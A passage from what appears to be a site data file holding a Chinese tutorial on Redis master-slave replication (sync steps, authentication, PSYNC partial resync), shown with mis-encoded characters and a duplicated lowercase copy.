æå¡å¨ï¼ä¸æç§° masterï¼çåå®¹ãæ¯æ¬¡å½ slave å master ä¹é´çè¿æ¥æ­å¼æ¶ï¼ slave ä¼èªå¨éè¿å° master ä¸ï¼å¹¶ä¸æ è®ºè¿æé´ master åçäºä»ä¹ï¼ slave é½å°å°è¯è®©èªèº«æä¸º master çç²¾ç¡®å¯æ¬ã\nè¿ä¸ªç³»ç»çè¿è¡ä¾é ä¸ä¸ªä¸»è¦çæºå¶ï¼\n\n * å½ä¸ä¸ª master å®ä¾åä¸ä¸ª slave å®ä¾è¿æ¥æ­£å¸¸æ¶ï¼ master ä¼åéä¸è¿ä¸²çå½ä»¤æµæ¥ä¿æå¯¹ slave çæ´æ°ï¼ä»¥ä¾¿äºå°èªèº«æ°æ®éçæ¹åå¤å¶ç» slave ï¼åæ¬å®¢æ·ç«¯çåå¥ãkey çè¿ææè¢«éåºç­ç­ (å¢é)ã\n * å½ master å slave ä¹é´çè¿æ¥æ­å¼ä¹åï¼å ä¸ºç½ç»é®é¢ãæèæ¯ä¸»ä»æè¯å°è¿æ¥è¶æ¶ï¼ slave éæ°è¿æ¥ä¸ master å¹¶ä¼å°è¯è¿è¡é¨åéåæ­¥ï¼è¿æå³çå®ä¼å°è¯åªè·åå¨æ­å¼è¿æ¥æé´åä¸¢å¤±çå½ä»¤ã\n * å½æ æ³è¿è¡é¨åéåæ­¥æ¶ï¼ slave ä¼è¯·æ±è¿è¡å¨ééåæ­¥ãè¿ä¼æ¶åå°ä¸ä¸ªæ´å¤æçè¿ç¨ï¼ä¾å¦ master éè¦åå»ºæææ°æ®çå¿«ç§ï¼å°ä¹åéç» slave ï¼ä¹åå¨æ°æ®éæ´æ¹æ¶æç»­åéå½ä»¤å° slave ã\n\nRedis é»è®¤ä½¿ç¨å¼æ­¥å¤å¶ï¼å¶ç¹ç¹æ¯ä½å»¶è¿åé«æ§è½ãslave æå¡ä¼å¼æ­¥å°ç¡®è®¤å¶ä» master æå¡å¨å¨ææ¥æ¶å°çæ°æ®éã\n\nRedis å¤å¶çéå¸¸éè¦çäºå®ï¼\n\n * Redis ä½¿ç¨å¼æ­¥å¤å¶ï¼slave å master ä¹é´å¼æ­¥ç¡®è®¤å¤çæ°æ®ã\n * ä¸ä¸ª master å¯ä»¥æ¥æå¤ä¸ª slave\n * slave å¯ä»¥æ¥åå¶ä» slave çè¿æ¥ãé¤äºå¤ä¸ª slave å¯ä»¥è¿æ¥å°åä¸ä¸ª master ä¹å¤ï¼ slave ä¹é´ä¹å¯ä»¥åå±å ç¶çç»æè¿æ¥å°å¶ä» slave ãèª Redis 4.0 èµ·ï¼ææç sub-slave å°ä¼ä» master æ¶å°å®å¨ä¸æ ·çå¤å¶æµã\n\n\n\n * Redis å¤å¶å¨ master æ¯éé»å¡çãè¿æå³ç master å¨ä¸ä¸ªæå¤ä¸ª slave è¿è¡åæ¬¡åæ­¥æèæ¯é¨åéåæ­¥æ¶ï¼å¯ä»¥ç»§ç»­å¤çæ¥è¯¢è¯·æ±ã\n * ä¸»ä»å¤å¶å¯¹äº slave æå¡å¨æ¥è¯´ä¹æ¯éé»å¡çï¼è¿æå³çï¼å³ä½¿ä» redis å¨è¿è¡ä¸»ä»å¤å¶è¿ç¨ä¸­ä¹å¯ä»¥æ¥åå¤ççæ¥è¯¢è¯·æ±ï¼åªä¸è¿è¿æ¶å slave è¿åçæ¯ä»¥åèçæ°æ®ï¼å¦æä½ ä¸æ³è¿æ ·ï¼é£ä¹å¨å¯å¨ redis æ¶ï¼å¯ä»¥å¨éç½®æä»¶ä¸­è¿è¡è®¾ç½®ï¼é£ä¹ slave å¨å¤å¶åæ­¥è¿ç¨ä¸­æ¥èªå¤ççæ¥è¯¢è¯·æ±é½ä¼è¿åéè¯¯ç»å®¢æ·ç«¯ï¼ï¼è½ç¶è¯´ä¸»ä»å¤å¶è¿ç¨ä¸­å¯¹äº slave æ¯éé»å¡çï¼ä½æ¯å½ slave ä» master åæ­¥è¿æ¥ææ°çæ°æ®åè¿éè¦å°æ°æ°æ®å è½½å°åå­ä¸­ï¼å¨å è½½å°åå­çè¿ç¨ä¸­æ¯é»å¡çï¼å¨è¿æ®µæ¶é´åçè¯·æ±å°ä¼è¢«é»ï¼ä½æ¯å³ä½¿å¯¹äºå¤§æ°æ®éï¼å è½½å°åå­çæ¶é´ä¹æ¯æ¯è¾å¤çï¼\n * ä¸»ä»å¤å¶æé«äº redis æå¡çæ©å±æ§ï¼é¿ååä¸ª redis æå¡å¨çè¯»åè®¿é®ååè¿å¤§çé®é¢ï¼åæ¶ä¹å¯ä»¥ç»ä¸ºæ°æ®å¤ä»½ååä½æä¾ä¸ç§è§£å³æ¹æ¡ï¼\n * ä¸ºäºé¿å master æå¡å¨åç£çååå¸¦æ¥çå¼éï¼å¯ä»¥éç½®è®© master ä¸å¨å°æ°æ®æä¹åå°ç£çï¼èæ¯éè¿è¿æ¥è®©ä¸ä¸ªéç½®ç slave æå¡å¨åæ¶çå°ç¸å³æ°æ®æä¹åå°ç£çï¼ä¸è¿è¿æ ·ä¼å­å¨ä¸ä¸ªé®é¢ï¼å°±æ¯ master æå¡å¨ä¸æ¦éå¯ï¼å ä¸º master æå¡å¨æ°æ®ä¸ºç©ºï¼è¿æ¶åéè¿ä¸»ä»åæ­¥å¯è½å¯¼è´ä» slave æå¡å¨ä¸çæ°æ®ä¹è¢«æ¸ç©ºï¼\n\n> å¼ºçå»ºè®®å¨ master åå¨ slave ä¸­å¯ç¨æä¹åãå¦åä¼æå¦ä¸é®é¢ï¼\n> æä»¬è®¾ç½®èç¹ A ä¸º master å¹¶å³é­å®çæä¹åè®¾ç½®ï¼slave B å C ä» èç¹ A å¤å¶æ°æ®ãèç¹ A å´©æºï¼ä½æ¯ä»æä¸äºèªå¨éå¯çç³»ç»å¯ä»¥éå¯è¿ç¨ãä½æ¯ç±äºæä¹åè¢«å³é­äºï¼èç¹éå¯åå¶æ°æ®éåä¸ºç©ºãèç¹ B å èç¹ C ä¼ä»èç¹ A å¤å¶æ°æ®ï¼ä½æ¯èç¹ A çæ°æ®éæ¯ç©ºçï¼å æ­¤å¤å¶çç»ææ¯å®ä»¬ä¼éæ¯èªèº«ä¹åçæ°æ®å¯æ¬ã\n> å½ Redis Sentinel è¢«ç¨äºé«å¯ç¨å¹¶ä¸ master å³é­æä¹åï¼è¿æ¶å¦æåè®¸èªå¨éå¯è¿ç¨ä¹æ¯å¾å±é©çãä¾å¦ï¼ master å¯ä»¥éå¯çè¶³å¤å¿«ä»¥è´äº Sentinel æ²¡ææ¢æµå°æéï¼å æ­¤ä¸è¿°çæéæ¨¡å¼ä¹ä¼åçã\n\n\n# å·¥ä½æ¨¡å¼\n\nRedis ä¸ç®¡æ¯æ§çè¿æ¯æ°çï¼å¤å¶çå®ç°é½å¯ä»¥åä¸ºä¸ä¸ªæ­¥éª¤ï¼\n\n\n\n\n# 1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£\n\n127.0.0.1:12345> SLAVEOF 127.0.0.1 6379\n\n\n1\n\n\nå½å®¢æ·ç«¯å slave å¨åéä»¥ä¸å½ä»¤æ¶æèå¨éç½®æä»¶ä¸­éç½® slaveof éé¡¹ãslave å°ååé SLAVEOF å½ä»¤ç å®¢æ·ç«¯ è¿å OKï¼è¡¨ç¤ºå¤å¶æä»¤å·²ç»è¢«æ¥æ¶ï¼èå®éä¸å¤å¶å·¥ä½æ¯å¨ OK è¿åä¹åè¿è¡ã\n\n\n# 2. å»ºç«å¥æ¥å­è¿æ¥\n\n\n\nslave å¨æ ¹æ®è®¾ç½®çå¥æ¥å­åå»ºè¿å master çå¥æ¥å­è¿æ¥ã master æ¥æ¶ slave å¨çå¥æ¥å­è¿æ¥ä¹åï¼ä¸ºè¯¥å¥æ¥å­åå»ºååºçå®¢æ·ç«¯ç¶æï¼å¹¶å°æ­¤æ¶ç slave å¨çåæ¯ master çå®¢æ·ç«¯ï¼ä¹å°±æ¯è¯¥ slave å¨åæ¶å·å¤æå¡å¨ä¸å®¢æ·ç«¯ä¸¤ä¸ªèº«ä»½ã\n\n\n# 3. åé PING å½ä»¤\n\n\n\nslave æä¸º master çå®¢æ·ç«¯ä¹åï¼åçç¬¬ä¸ä»¶äºå°±æ¯å master åé PING å½ä»¤ãPING å½ä»¤ä¸»è¦æä¸¤ç§ä½ç¨ï¼\n\n * è½ç¶å»ºç«äºå¥æ¥å­è¿æ¥ï¼ä½æ¯è¿æªä½¿ç¨è¿ï¼éè¿åé PING å½ä»¤æ£æ¥å¥æ¥å­çè¯»åç¶ææ¯å¦æ­£å¸¸\n * éè¿åé PING å½ä»¤æ£æ¥ master è½å¦æ­£å¸¸å¤çå½ä»¤è¯·æ±\n\nslave å¨åé PING å½ä»¤ä¹åå°éå°ä»¥ä¸ä¸ç§æåµçå¶ä¸­ä¸ç§ï¼\n\n * master å slave è¿åä¸ä¸ªåå¤ï¼ä½æ¯ slave å´ä¸è½å¨è§å®çä¼æ¶é´ï¼timeoutï¼åè¯»åå½ä»¤åå¤çåå®¹ï¼åè¡¨ç¤ºå½åä¸» slave ä¹é´çç½ç»ç¶æè¿æ¥ä¸ä½³ï¼ä¸è½åºç¡æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * master å slave è¿åä¸ä¸ªéè¯¯ï¼é£ä¹è¡¨ç¤º master ææ¶æ²¡æåæ³å¤ç slave å¨çå½ä»¤è¯·æ±ï¼ä¸è½ç»§ç»­æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * å¦æ slave è¯»åå° âPONGâ åå¤ï¼é£ä¹è¡¨ç¤ºä¸»ä»ä¹é´ç½ç»è¿æ¥æ­£å¸¸ï¼å¹¶ä¸ master å¯ä»¥å¤ç slave åéçå½ä»¤è¯·æ±ã\n\n\n# 4. èº«ä»½éªè¯\n\nslave æ¥æ¶å° master è¿åç âPONGâ åå¤ï¼æ¥ä¸æ¥å°±éè¦èèèº«ä»½éªè¯çäºã\n\n\n\nå¦æ slave è®¾ç½®äº masterauth éé¡¹ï¼é£ä¹è¿è¡èº«ä»½éªè¯\nå¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼é£ä¹ä¸è¿è¡èº«ä»½éªè¯\nslave å¨èº«ä»½éªè¯çæ¶åå¯è½éå°ä¸ç§æåµ\n\n * ä¸»æå¡æ²¡æè®¾ç½® requirepass éé¡¹ï¼å¹¶ä¸ slave ä¹æ²¡æè®¾ç½® masterquth éé¡¹ï¼é£ä¹ master ç»§ç»­æ§è¡ slave å½ä»¤ï¼å®æå¤å¶å·¥ä½\n * å¦æ slave éè¿ AUTH å½ä»¤åéçå¯ç ä¸ master ä¸­ requirepass å¯ç ç¸åï¼é£ä¹ master å°ç»§ç»­æ§è¡ slave åéçå½ä»¤ï¼å¤å¶å·¥ä½ç»§ç»­ï¼ä¸æ­¤ç¸åï¼å¯ç ä¸ä¸è´ï¼åä¼è¿å invalid password éè¯¯\n * å¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼è master è®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ master å°è¿åä¸ä¸ª NOAUTH éè¯¯ãåä¹æ²¡æè®¾è®¾ç½® masterauth éé¡¹ï¼èè®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ä¼è¿å no password is set éè¯¯ã\n\n\n# 5. åéç«¯å£ä¿¡æ¯\n\nå¨èº«ä»½éªè¯æ­¥éª¤ä¹åï¼slave å°æ§è¡å½ä»¤ REPLCONF listening-port <port> ï¼å master åé slave ççå¬ç«¯å£å·ã\n\n\n# 6. åæ­¥ 7. å½ä»¤ä¼ æ­\n\nslave å master åé PSYNC å½ä»¤ï¼æ§è¡åæ­¥æä½ï¼å¼å¾æ³¨æçæ¯åªæ slave æ¯ master çå®¢æ·ç«¯ï¼ä½æ¯æ§è¡åæ­¥æä½ä¹åï¼master ä¹ä¼æä¸º slave çå®¢æ·ç«¯ã\n\nMASTER                                            SLAVE                             å¤æ³¨\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            ä¸»ä»é½å¯å¨ï¼å¹¶å®æåæ­¥\nset k1,v1                                         set k1,v1                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\nset k2,v2                                         set k2,v2                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\n......                                            ......                            æ´å¤çæä½\nä¸»ä»æ­å¼è¿æ¥                                            ä¸»ä»æ­å¼è¿æ¥                            slave æéåæ­¢äºåæ­¥æä½\nset k5002,v5002                                                                     slave å°è¯éæ°è¿æ¥\nset k5003,v5003                                                                     slave å°è¯éæ°è¿æ¥\nä¸»ä»éè¿æ¥æå                                           ä¸»ä»éè¿æ¥æå                           ä¸»ä»éè¿æ¥æå\n                                                  PSYNC                             è¿æ¥æåï¼slave å master åé PSYNC å½ä»¤ï¼æ§è¡åæ­¥ï¼ä»¥ä¸ç¬¬ 6 æ­¥\nå slave è¿å + CONTINUEï¼å¹¶æ§è¡åæ­¥                                                         \n                                                  æ¥æ¶ + CONTINUE                     slave æ¥æ¶ + CONTINUEï¼åå¤æ§è¡é¨ååæ­¥\nå slave åé set k5002,v5002 å set k5003,v5003 å½ä»¤                                     \n                                                  set k5002,v5002 set k5003,v5003   ä»æ¥æ¶å°å½ä»¤å¹¶æ§è¡\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            åæ­¥å®æ\n\n> é«çæ¬ç Redis slave é»è®¤ä¸ºåªè¯»ã",normalizedContent:"redis é«å¯ç¨ä¸»è¦æ¯ä½¿ç¨ ä¸»ä»å¤å¶ å å¨åµæ¥åï¼éç¾¤ä¸è½ç®æ¯é«å¯ç¨ï¼å ä¸ºå½èç¹ b æå¤§éçæ°æ®ï¼å¦æèç¹ b ææï¼å°±åæ æ³è®¿é®å°èç¹ b çæ°æ®ï¼å ä¸ºå¶ä»èç¹å¹¶ä¸ä¼æèç¹ b çæ°æ®ãå¶ä¸­çåå è·æ¬èº« redis çè®¾è®¡æå³ã\n\n\n# å¤å¶\n\nä½¿ç¨åéç½®ä¸»ä»å¤å¶éå¸¸ç®åï¼ä» redis æå¡å¨ï¼ä¸æç§° slaveï¼è½ç²¾ç¡®å¾å¤å¶ä¸» redis æå¡å¨ï¼ä¸æç§° masterï¼çåå®¹ãæ¯æ¬¡å½ slave å master ä¹é´çè¿æ¥æ­å¼æ¶ï¼ slave ä¼èªå¨éè¿å° master ä¸ï¼å¹¶ä¸æ è®ºè¿æé´ master åçäºä»ä¹ï¼ slave é½å°å°è¯è®©èªèº«æä¸º master çç²¾ç¡®å¯æ¬ã\nè¿ä¸ªç³»ç»çè¿è¡ä¾é ä¸ä¸ªä¸»è¦çæºå¶ï¼\n\n * å½ä¸ä¸ª master å®ä¾åä¸ä¸ª slave å®ä¾è¿æ¥æ­£å¸¸æ¶ï¼ master ä¼åéä¸è¿ä¸²çå½ä»¤æµæ¥ä¿æå¯¹ slave çæ´æ°ï¼ä»¥ä¾¿äºå°èªèº«æ°æ®éçæ¹åå¤å¶ç» slave ï¼åæ¬å®¢æ·ç«¯çåå¥ãkey çè¿ææè¢«éåºç­ç­ (å¢é)ã\n * å½ master å slave ä¹é´çè¿æ¥æ­å¼ä¹åï¼å ä¸ºç½ç»é®é¢ãæèæ¯ä¸»ä»æè¯å°è¿æ¥è¶æ¶ï¼ slave éæ°è¿æ¥ä¸ master å¹¶ä¼å°è¯è¿è¡é¨åéåæ­¥ï¼è¿æå³çå®ä¼å°è¯åªè·åå¨æ­å¼è¿æ¥æé´åä¸¢å¤±çå½ä»¤ã\n * å½æ æ³è¿è¡é¨åéåæ­¥æ¶ï¼ slave ä¼è¯·æ±è¿è¡å¨ééåæ­¥ãè¿ä¼æ¶åå°ä¸ä¸ªæ´å¤æçè¿ç¨ï¼ä¾å¦ master éè¦åå»ºæææ°æ®çå¿«ç§ï¼å°ä¹åéç» slave ï¼ä¹åå¨æ°æ®éæ´æ¹æ¶æç»­åéå½ä»¤å° slave ã\n\nredis é»è®¤ä½¿ç¨å¼æ­¥å¤å¶ï¼å¶ç¹ç¹æ¯ä½å»¶è¿åé«æ§è½ãslave æå¡ä¼å¼æ­¥å°ç¡®è®¤å¶ä» master æå¡å¨å¨ææ¥æ¶å°çæ°æ®éã\n\nredis å¤å¶çéå¸¸éè¦çäºå®ï¼\n\n * redis ä½¿ç¨å¼æ­¥å¤å¶ï¼slave å master ä¹é´å¼æ­¥ç¡®è®¤å¤çæ°æ®ã\n * ä¸ä¸ª master å¯ä»¥æ¥æå¤ä¸ª slave\n * slave å¯ä»¥æ¥åå¶ä» slave çè¿æ¥ãé¤äºå¤ä¸ª slave å¯ä»¥è¿æ¥å°åä¸ä¸ª master ä¹å¤ï¼ slave ä¹é´ä¹å¯ä»¥åå±å ç¶çç»æè¿æ¥å°å¶ä» slave ãèª redis 4.0 èµ·ï¼ææç sub-slave å°ä¼ä» master æ¶å°å®å¨ä¸æ ·çå¤å¶æµã\n\n\n\n * redis å¤å¶å¨ master æ¯éé»å¡çãè¿æå³ç master å¨ä¸ä¸ªæå¤ä¸ª slave è¿è¡åæ¬¡åæ­¥æèæ¯é¨åéåæ­¥æ¶ï¼å¯ä»¥ç»§ç»­å¤çæ¥è¯¢è¯·æ±ã\n * ä¸»ä»å¤å¶å¯¹äº slave æå¡å¨æ¥è¯´ä¹æ¯éé»å¡çï¼è¿æå³çï¼å³ä½¿ä» redis å¨è¿è¡ä¸»ä»å¤å¶è¿ç¨ä¸­ä¹å¯ä»¥æ¥åå¤ççæ¥è¯¢è¯·æ±ï¼åªä¸è¿è¿æ¶å slave è¿åçæ¯ä»¥åèçæ°æ®ï¼å¦æä½ ä¸æ³è¿æ ·ï¼é£ä¹å¨å¯å¨ redis æ¶ï¼å¯ä»¥å¨éç½®æä»¶ä¸­è¿è¡è®¾ç½®ï¼é£ä¹ slave å¨å¤å¶åæ­¥è¿ç¨ä¸­æ¥èªå¤ççæ¥è¯¢è¯·æ±é½ä¼è¿åéè¯¯ç»å®¢æ·ç«¯ï¼ï¼è½ç¶è¯´ä¸»ä»å¤å¶è¿ç¨ä¸­å¯¹äº slave æ¯éé»å¡çï¼ä½æ¯å½ slave ä» master åæ­¥è¿æ¥ææ°çæ°æ®åè¿éè¦å°æ°æ°æ®å è½½å°åå­ä¸­ï¼å¨å è½½å°åå­çè¿ç¨ä¸­æ¯é»å¡çï¼å¨è¿æ®µæ¶é´åçè¯·æ±å°ä¼è¢«é»ï¼ä½æ¯å³ä½¿å¯¹äºå¤§æ°æ®éï¼å è½½å°åå­çæ¶é´ä¹æ¯æ¯è¾å¤çï¼\n * ä¸»ä»å¤å¶æé«äº redis æå¡çæ©å±æ§ï¼é¿ååä¸ª redis æå¡å¨çè¯»åè®¿é®ååè¿å¤§çé®é¢ï¼åæ¶ä¹å¯ä»¥ç»ä¸ºæ°æ®å¤ä»½ååä½æä¾ä¸ç§è§£å³æ¹æ¡ï¼\n * ä¸ºäºé¿å master æå¡å¨åç£çååå¸¦æ¥çå¼éï¼å¯ä»¥éç½®è®© master ä¸å¨å°æ°æ®æä¹åå°ç£çï¼èæ¯éè¿è¿æ¥è®©ä¸ä¸ªéç½®ç slave æå¡å¨åæ¶çå°ç¸å³æ°æ®æä¹åå°ç£çï¼ä¸è¿è¿æ ·ä¼å­å¨ä¸ä¸ªé®é¢ï¼å°±æ¯ master æå¡å¨ä¸æ¦éå¯ï¼å ä¸º master æå¡å¨æ°æ®ä¸ºç©ºï¼è¿æ¶åéè¿ä¸»ä»åæ­¥å¯è½å¯¼è´ä» slave æå¡å¨ä¸çæ°æ®ä¹è¢«æ¸ç©ºï¼\n\n> å¼ºçå»ºè®®å¨ master åå¨ slave ä¸­å¯ç¨æä¹åãå¦åä¼æå¦ä¸é®é¢ï¼\n> æä»¬è®¾ç½®èç¹ a ä¸º master å¹¶å³é­å®çæä¹åè®¾ç½®ï¼slave b å c ä» èç¹ a å¤å¶æ°æ®ãèç¹ a å´©æºï¼ä½æ¯ä»æä¸äºèªå¨éå¯çç³»ç»å¯ä»¥éå¯è¿ç¨ãä½æ¯ç±äºæä¹åè¢«å³é­äºï¼èç¹éå¯åå¶æ°æ®éåä¸ºç©ºãèç¹ b å èç¹ c ä¼ä»èç¹ a å¤å¶æ°æ®ï¼ä½æ¯èç¹ a çæ°æ®éæ¯ç©ºçï¼å æ­¤å¤å¶çç»ææ¯å®ä»¬ä¼éæ¯èªèº«ä¹åçæ°æ®å¯æ¬ã\n> å½ redis sentinel è¢«ç¨äºé«å¯ç¨å¹¶ä¸ master å³é­æä¹åï¼è¿æ¶å¦æåè®¸èªå¨éå¯è¿ç¨ä¹æ¯å¾å±é©çãä¾å¦ï¼ master å¯ä»¥éå¯çè¶³å¤å¿«ä»¥è´äº sentinel æ²¡ææ¢æµå°æéï¼å æ­¤ä¸è¿°çæéæ¨¡å¼ä¹ä¼åçã\n\n\n# å·¥ä½æ¨¡å¼\n\nredis ä¸ç®¡æ¯æ§çè¿æ¯æ°çï¼å¤å¶çå®ç°é½å¯ä»¥åä¸ºä¸ä¸ªæ­¥éª¤ï¼\n\n\n\n\n# 1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£\n\n127.0.0.1:12345> slaveof 127.0.0.1 6379\n\n\n1\n\n\nå½å®¢æ·ç«¯å slave å¨åéä»¥ä¸å½ä»¤æ¶æèå¨éç½®æä»¶ä¸­éç½® slaveof éé¡¹ãslave å°ååé slaveof å½ä»¤ç å®¢æ·ç«¯ è¿å okï¼è¡¨ç¤ºå¤å¶æä»¤å·²ç»è¢«æ¥æ¶ï¼èå®éä¸å¤å¶å·¥ä½æ¯å¨ ok è¿åä¹åè¿è¡ã\n\n\n# 2. å»ºç«å¥æ¥å­è¿æ¥\n\n\n\nslave å¨æ ¹æ®è®¾ç½®çå¥æ¥å­åå»ºè¿å master çå¥æ¥å­è¿æ¥ã master æ¥æ¶ slave å¨çå¥æ¥å­è¿æ¥ä¹åï¼ä¸ºè¯¥å¥æ¥å­åå»ºååºçå®¢æ·ç«¯ç¶æï¼å¹¶å°æ­¤æ¶ç slave å¨çåæ¯ master çå®¢æ·ç«¯ï¼ä¹å°±æ¯è¯¥ slave å¨åæ¶å·å¤æå¡å¨ä¸å®¢æ·ç«¯ä¸¤ä¸ªèº«ä»½ã\n\n\n# 3. åé ping å½ä»¤\n\n\n\nslave æä¸º master çå®¢æ·ç«¯ä¹åï¼åçç¬¬ä¸ä»¶äºå°±æ¯å master åé ping å½ä»¤ãping å½ä»¤ä¸»è¦æä¸¤ç§ä½ç¨ï¼\n\n * è½ç¶å»ºç«äºå¥æ¥å­è¿æ¥ï¼ä½æ¯è¿æªä½¿ç¨è¿ï¼éè¿åé ping å½ä»¤æ£æ¥å¥æ¥å­çè¯»åç¶ææ¯å¦æ­£å¸¸\n * éè¿åé ping å½ä»¤æ£æ¥ master è½å¦æ­£å¸¸å¤çå½ä»¤è¯·æ±\n\nslave å¨åé ping å½ä»¤ä¹åå°éå°ä»¥ä¸ä¸ç§æåµçå¶ä¸­ä¸ç§ï¼\n\n * master å slave è¿åä¸ä¸ªåå¤ï¼ä½æ¯ slave å´ä¸è½å¨è§å®çä¼æ¶é´ï¼timeoutï¼åè¯»åå½ä»¤åå¤çåå®¹ï¼åè¡¨ç¤ºå½åä¸» slave ä¹é´çç½ç»ç¶æè¿æ¥ä¸ä½³ï¼ä¸è½åºç¡æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * master å slave è¿åä¸ä¸ªéè¯¯ï¼é£ä¹è¡¨ç¤º master ææ¶æ²¡æåæ³å¤ç slave å¨çå½ä»¤è¯·æ±ï¼ä¸è½ç»§ç»­æ§è¡å¤å¶å·¥ä½çåç»­æ­¥éª¤ï¼è¿æ¶ slave ä¼æ­å¼å¥æ¥å­è¿æ¥éæ°åå»ºã\n * å¦æ slave è¯»åå° âpongâ åå¤ï¼é£ä¹è¡¨ç¤ºä¸»ä»ä¹é´ç½ç»è¿æ¥æ­£å¸¸ï¼å¹¶ä¸ master å¯ä»¥å¤ç slave åéçå½ä»¤è¯·æ±ã\n\n\n# 4. èº«ä»½éªè¯\n\nslave æ¥æ¶å° master è¿åç âpongâ åå¤ï¼æ¥ä¸æ¥å°±éè¦èèèº«ä»½éªè¯çäºã\n\n\n\nå¦æ slave è®¾ç½®äº masterauth éé¡¹ï¼é£ä¹è¿è¡èº«ä»½éªè¯\nå¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼é£ä¹ä¸è¿è¡èº«ä»½éªè¯\nslave å¨èº«ä»½éªè¯çæ¶åå¯è½éå°ä¸ç§æåµ\n\n * ä¸»æå¡æ²¡æè®¾ç½® requirepass éé¡¹ï¼å¹¶ä¸ slave ä¹æ²¡æè®¾ç½® masterquth éé¡¹ï¼é£ä¹ master ç»§ç»­æ§è¡ slave å½ä»¤ï¼å®æå¤å¶å·¥ä½\n * å¦æ slave éè¿ auth å½ä»¤åéçå¯ç ä¸ master ä¸­ requirepass å¯ç ç¸åï¼é£ä¹ master å°ç»§ç»­æ§è¡ slave åéçå½ä»¤ï¼å¤å¶å·¥ä½ç»§ç»­ï¼ä¸æ­¤ç¸åï¼å¯ç ä¸ä¸è´ï¼åä¼è¿å invalid password éè¯¯\n * å¦æ slave æ²¡æè®¾ç½® masterauth éé¡¹ï¼è master è®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ master å°è¿åä¸ä¸ª noauth éè¯¯ãåä¹æ²¡æè®¾è®¾ç½® masterauth éé¡¹ï¼èè®¾ç½®äº requirepass éé¡¹ï¼é£ä¹ä¼è¿å no password is set éè¯¯ã\n\n\n# 5. åéç«¯å£ä¿¡æ¯\n\nå¨èº«ä»½éªè¯æ­¥éª¤ä¹åï¼slave å°æ§è¡å½ä»¤ replconf listening-port <port> ï¼å master åé slave ççå¬ç«¯å£å·ã\n\n\n# 6. åæ­¥ 7. å½ä»¤ä¼ æ­\n\nslave å master åé psync å½ä»¤ï¼æ§è¡åæ­¥æä½ï¼å¼å¾æ³¨æçæ¯åªæ slave æ¯ master çå®¢æ·ç«¯ï¼ä½æ¯æ§è¡åæ­¥æä½ä¹åï¼master ä¹ä¼æä¸º slave çå®¢æ·ç«¯ã\n\nmaster                                            slave                             å¤æ³¨\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            ä¸»ä»é½å¯å¨ï¼å¹¶å®æåæ­¥\nset k1,v1                                         set k1,v1                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\nset k2,v2                                         set k2,v2                         master æ§è¡ set ä¼ä¼ æ­å° slave è¿è¡ set\n......                                            ......                            æ´å¤çæä½\nä¸»ä»æ­å¼è¿æ¥                                            ä¸»ä»æ­å¼è¿æ¥                            slave æéåæ­¢äºåæ­¥æä½\nset k5002,v5002                                                                     slave å°è¯éæ°è¿æ¥\nset k5003,v5003                                                                     slave å°è¯éæ°è¿æ¥\nä¸»ä»éè¿æ¥æå                                           ä¸»ä»éè¿æ¥æå                           ä¸»ä»éè¿æ¥æå\n                                                  psync                             è¿æ¥æåï¼slave å master åé psync å½ä»¤ï¼æ§è¡åæ­¥ï¼ä»¥ä¸ç¬¬ 6 æ­¥\nå slave è¿å + continueï¼å¹¶æ§è¡åæ­¥                                                         \n                                                  æ¥æ¶ + continue                     slave æ¥æ¶ + continueï¼åå¤æ§è¡é¨ååæ­¥\nå slave åé set k5002,v5002 å set k5003,v5003 å½ä»¤                                     \n                                                  set k5002,v5002 set k5003,v5003   ä»æ¥æ¶å°å½ä»¤å¹¶æ§è¡\nä¸»ä»å®æåæ­¥                                            ä¸»ä»å®æåæ­¥                            åæ­¥å®æ\n\n> é«çæ¬ç redis slave é»è®¤ä¸ºåªè¯»ã",charsets:{cjk:!0}},{title:"Redisé«å¯ç¨(ä¸) æ­å»º",frontmatter:{title:"Redisé«å¯ç¨(ä¸) æ­å»º",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1609",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1609.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%B8%89)%20%E6%90%AD%E5%BB%BA.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1609.Redisé«å¯ç¨(ä¸) æ­å»º.md",key:"v-727d91d9",path:"/Redis/1609/",headers:[{level:2,title:"ç¯å¢",slug:"ç¯å¢",normalizedTitle:"ç¯å¢",charIndex:2},{level:2,title:"ä¸»ä»æ­å»º",slug:"ä¸»ä»æ­å»º",normalizedTitle:"ä¸»ä»æ­å»º",charIndex:231},{level:2,title:"å¨åµ",slug:"å¨åµ",normalizedTitle:"å¨åµ",charIndex:794},{level:3,title:"å¨åµå¯å¨",slug:"å¨åµå¯å¨",normalizedTitle:"å¨åµå¯å¨",charIndex:2443},{level:2,title:"spring boot redis å¨åµ",slug:"spring-boot-redis-å¨åµ",normalizedTitle:"spring boot redis å¨åµ",charIndex:2599}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç¯å¢ ä¸»ä»æ­å»º å¨åµ å¨åµå¯å¨ spring boot redis å¨åµ",content:'# ç¯å¢\n\nèèå°æ¢ç¶æ¯é«å¯ç¨ï¼é£ä¹ Sentinel 